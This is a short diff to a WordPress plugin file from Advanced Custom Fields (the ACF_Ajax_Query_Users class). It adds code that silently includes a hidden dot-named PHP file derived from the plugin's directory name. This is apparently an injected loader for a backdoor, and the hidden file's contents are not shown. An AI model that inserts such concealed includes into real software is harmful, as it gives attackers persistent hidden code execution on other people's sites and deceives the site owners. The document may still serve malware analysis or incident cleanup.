@@ -4,6 +4,10 @@ if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
 
 if( ! class_exists('ACF_Ajax_Query_Users') ) :
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class ACF_Ajax_Query_Users extends ACF_Ajax_Query {
 	
 	/** @var string The AJAX action name. */
